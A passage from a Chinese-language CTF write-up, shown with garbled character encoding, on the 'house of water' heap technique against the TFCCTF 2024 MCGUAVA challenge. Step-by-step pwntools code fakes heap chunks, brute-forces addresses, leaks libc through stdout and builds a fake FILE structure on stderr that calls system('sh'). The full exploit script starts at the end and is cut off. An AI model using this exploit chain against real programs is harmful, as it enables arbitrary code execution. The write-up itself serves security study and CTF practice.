é‡Šæ”¾æ‰è¿›å…¥ tcache<br>è¿™é‡Œæˆ‘ä»¬å°†ä¸Šé¢ä»£ç è¿›è¡Œä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line">free(<span class="number">15</span>) <span class="comment"># free unsorted_start</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡Šæ”¾äº†æˆ‘ä»¬ unsorted_startï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° 0x30 çš„ tcache å’Œ unsorted bin æŒ‡å‘çš„æ˜¯åŒä¸€å—åŒºåŸŸï¼Œè¯´æ˜æˆ‘ä»¬ä¼ªé€ æˆåŠŸ<br>å¯¹äº unsorted_end ä¸Šæ–¹ fake chunk çš„ä¼ªé€ åŸç†ç›¸åŒï¼Œåªä¸è¿‡è¿™é‡Œçš„ fake chunk å¤§å°ä¸º 0x20ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">free(<span class="number">21</span>)</span><br><span class="line">free(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦è·å– unsorted_middle è¿™ä¸ªå †å—çš„ç´¢å¼•ï¼Œå› ä¸ºè¿™ä¸ªå †å—ä¸éœ€è¦åœ¨ä¸Šæ–¹ä¼ªé€  fake chunkï¼Œæ‰€ä»¥ç´¢å¼•æ¯”è¾ƒå®¹æ˜“è·å¾—ï¼Œç›´æ¥ç”³è¯·å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå †å—åŒæ ·æ˜¯ä¸ºäº†é˜²æ­¢åˆå¹¶<br>åé¢ä¾ç„¶è¿›è¡Œç®€å•çš„æ“ä½œï¼Œåœ¨ tcache_perthread_struct ä¸Šè¿›è¡Œ fake unsorted chunk çš„ä¼ªé€ ï¼Œè¿™éƒ¨ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå·²ç»æˆä¸ºæ¨¡æ¿åŒ–çš„ä¸œè¥¿äº†ï¼Œç”³è¯· 2 ä¸ª size åˆ†åˆ«ä¸º 0x3f0 å’Œ 0x3e0 çš„å †å—ç„¶åç›´æ¥é‡Šæ”¾æ‰å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">free(<span class="number">29</span>)</span><br><span class="line">free(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><h3 id="è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—"><a href="#è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—" class="headerlink" title="è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—"></a>è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—</h3><p>è¿™ä¸€æ­¥ä¸»è¦æ˜¯å› ä¸ºç¨‹åºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬å°† unsorted_endã€unsorted_middleã€unsorted_start é‡Šæ”¾è¿› unsorted bin æ—¶æˆ‘ä»¬å°±æ— æ³•ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„æŒ‡é’ˆã€‚<br>è¿™é‡Œæˆ‘è¿˜æ˜¯ä½¿ç”¨å †å—åˆ‡å‰²æ˜¯æ€æƒ³ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">free(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">free(<span class="number">24</span>)</span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">free(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äºä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—æˆ‘é€‰æ‹©çš„å¤§å°ä¸º 0x340 å’Œ 0x350ï¼Œå› ä¸ºè¿™ä¸ª 2 ä¸ªå¤§å°çš„å †å—ä¸ªé‡Šæ”¾åæ˜¯ç›´æ¥è¿›å…¥ tcacheï¼Œå¯¹åé¢ unsorted bin ä¸­å­˜å‚¨çš„ unsorted_endã€unsorted_middleã€unsorted_start å½±å“æ¯”è¾ƒå°<br>ä½†ç”±äºè¿™ä¸ªæ“ä½œæ”¹å˜äº†åŸæ¥ unsorted_endã€unsorted_start çš„ sizeä½</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨æˆ‘ä»¬åˆšè·å–çš„ tcache å †å—æ¥å¯¹ unsorted_endã€unsorted_start çš„ size ä½è¿›è¡Œæ¢å¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">free(<span class="number">39</span>) </span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">free(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><h3 id="ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size"><a href="#ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size" class="headerlink" title="ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size"></a>ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size</h3><p>å› ä¸ºæˆ‘ä»¬çš„ fake unsorted chunk æœ€ç»ˆè¿›å…¥åˆ° unsorted bin ä¸­ï¼Œunsorted bin ä¼šæ£€æµ‹è¿™ä¸ªå †å—çš„åˆæ³•æ€§ï¼Œä¼šæ£€æµ‹ fake unosrted chunk çš„ next chunk çš„prev_size å’Œ sizeï¼Œä¼ªé€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ next chunk çš„ issue ä½è¦ä¸º 0ï¼Œå› ä¸º unsorted bin ä¸Šçš„å †å—éƒ½æ˜¯æ²¡æœ‰ç»™ä½¿ç”¨çš„<br>æ¥ä¸‹æ¥å°±æ˜¯æ„‰å¿«çš„ä¸€æ¡é¾™æœåŠ¡ï¼Œä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start è¿›å…¥ unsorted binï¼Œç„¶ååˆ†åˆ«ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„ fd å’Œ bk æŒ‡é’ˆå°† fake unsorted chunk é“¾å…¥ unsorted bin ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">free(<span class="number">78</span>)</span><br><span class="line">free(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">free(<span class="number">27</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">free(<span class="number">80</span>)</span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">free(<span class="number">81</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æå‰ç”³è¯·äº† 2 ä¸ª chunkï¼Œå¤§å°åˆ†åˆ«ä¸º 0x240 å’Œ 0x250ï¼Œè¿™ 2 ä¸ªå †å—åœ¨åç»­çš„æ”»å‡»ä¸­ä¼šç”¨åˆ°ã€‚åœ¨ä¿®æ”¹ fd å’Œ bkæŒ‡é’ˆä¸­æˆ‘ä»¬éœ€è¦çˆ†ç ´åœ°å€çš„ç¬¬ 4 ä½ï¼Œæ¦‚ç‡ä¸º 1&#x2F;16ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çˆ†ç ´çš„æ˜¯ heapbase çš„ç¬¬ 4 ä½ä¸º 0ï¼ŒæˆåŠŸåçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° fake unsorted chunk å·²ç»è¿›å…¥åˆ° unsorted bin ä¸­ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ç›®å‰çš„çŠ¶å†µï¼š<br>ç›®å‰ unsorted bin ä¸­æœ‰ 3 ä¸ªå †å—ï¼Œä¸¤ä¾§çš„ unsorted_endã€unsorted_start å¤§å°ä¸º 0x510ï¼Œä¸­é—´çš„ fake unsorted chunk çš„å¤§å°ä¸º 0x10001ï¼Œä¸¤ä¾§çš„å †å—ååˆ†çš„ç¢äº‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶ç”³è¯·å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ fake unsorted chunk å·²ç»è¿›å…¥åˆ° largebin ä¸­ï¼Œå¹¶åœ¨ tcache ä¸Šè¸©ä¸‹ libc çš„åœ°å€</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç°åœ¨æˆ‘ä»¬çš„æ€è·¯å°±éå¸¸çš„æ˜ç¡®äº†ï¼Œæˆ‘çš„åšæ³•æ˜¯å…ˆç”³è¯·ä¸€ä¸ª 0x110 å¤§å°çš„å †å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>))</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ largebin çš„ fd æŒ‡é’ˆæ‰€åœ¨çš„ä½ç½®æ­£å¥½æ˜¯ tcache_perthread_struct ä¸Š 0x240 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„å­˜å‚¨åœ°å€ï¼Œæ­¤æ—¶å·²ç»ç»™è¸©ä¸Šäº† libc çš„åœ°å€</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç„¶åå†å°†è¯¥åœ°å€ç”³è¯·å‡ºæ¥ï¼Œå°†åœ°å€çš„ä½ 3 ä½æ”¹ä¸º stdout åœ°å€çš„ä½ 3 ä½ï¼Œçˆ†ç ´ç¬¬ 4 ä½ï¼Œç”¨ tcache åˆ†é…å †å—åˆ° stdout ä¸Šè¿›è€Œæ³„éœ²å‡º libc çš„åœ°å€ï¼Œè¿™é‡Œçš„çˆ†ç ´æˆåŠŸç‡ä¹Ÿä¸º 1&#x2F;16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) </span><br><span class="line">add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br></pre></td></tr></table></figure><p>è·å– libc åœ°å€åæˆ‘ä»¬å¯ä»¥å§åˆšæ‰ç”³è¯·åœ¨ tcache_perthread_struct ä¸Šçš„å †å—é‡Šæ”¾æ‰å†é‡æ–°ç”³è¯·å›æ¥ï¼Œç„¶ååœ¨ tcache_perthread_struct ä¸Šå­˜å‚¨ 0x250 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„åœ°æ–¹å†™ä¸Š <em>IO_2_1_stderr</em>  çš„åœ°å€ï¼Œå¹¶ç”³è¯· 0x250 å¤§å°çš„å †å—åœ¨ <em>IO_2_1_stderr</em> ä¸Šå†™ä¸Š fake file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">86</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">    <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br></pre></td></tr></table></figure><p>æœ€åè®©ç¨‹åºé€šè¿‡ exit å‡½æ•°é€€å‡ºå³å¯æ‰§è¡Œæˆ‘ä»¬çš„ fsop æ”»å‡»<br>ä¸‹é¢ç»™å‡ºå®Œæ•´ expï¼Œexp å†™çš„æ¯”è¾ƒä¹±ä¸”æ³¨é‡Šä¸Šå¯¹å †å—çš„æ ‡å·æœ‰ç‚¹ä¸å¤ªå‡†ç¡®ï¼Œè¯·å¸ˆå‚…ä»¬å¤šå¤šåŒ…å®¹ğŸ˜‡</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([<span 